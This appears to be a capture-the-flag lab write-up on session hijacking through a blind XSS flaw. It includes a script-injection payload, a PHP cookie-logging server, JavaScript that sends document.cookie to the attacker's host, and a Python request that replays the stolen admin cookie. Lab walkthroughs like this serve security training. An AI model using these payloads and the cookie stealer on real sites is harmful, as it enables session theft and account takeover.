# Session Hijacking

Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the ‘Session Hijacking’ scripts to grab the Admin’s cookie and use it in ‘login.php’ to get the flag.

- The first thing was to test the payloads field by field until someone sent a connection to my server

![](https://miro.medium.com/v2/resize:fit:700/1*VJ7_JqINL6dcwDMqyCOjJA.png)

- Payload used:

"><script src=http://10.10.15.121></script>

- Now that we know the field that is vulnerable, I will create a php server and a script.js to be run remotely

<?php  
if (isset($_GET['c'])) {  
    $list = explode(";", $_GET['c']);  
    foreach ($list as $key => $value) {  
        $cookie = urldecode($value);  
        $file = fopen("cookies.txt", "a+");  
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");  
        fclose($file);  
    }  
}  
?>

document.location='http://10.10.15.121/index.php?c='+document.cookie;  
new Image().src='http://10.10.15.121/index.php?c='+document.cookie;

- Now just run the server and use the same script payload, just adding /script.js next to our ip.  
    (“><script src=http://10.10.15.121/script.js></script>)

![](https://miro.medium.com/v2/resize:fit:700/1*MoD_ZT259NlR5BpNUnA71A.png)

- With the cookies in hand, we can go to /login.php through the browser, and add the cookie manually via the storage>cookies tab, but I created a script in Python that already makes the direct request

import requests  
  
url = "http://10.129.172.128/hijacking/login.php"  
headers = {  
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",  
    "Accept-Encoding": "gzip, deflate",  
    "Accept-Language": "pt-BR,pt",  
    "Cache-Control": "max-age=0",  
    "Connection": "keep-alive",  
    "Cookie": "cookie=c00k1355h0u1d8353cu23d",  
    "Host": "10.129.172.128",  
    "Sec-GPC": "1",  
    "Upgrade-Insecure-Requests": "1",  
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"  
}  
  
response = requests.get(url, headers=headers)  
  
print(response.text)

![](https://miro.medium.com/v2/resize:fit:700/1*qpF31q8vkTOyubI9nkMo9w.png)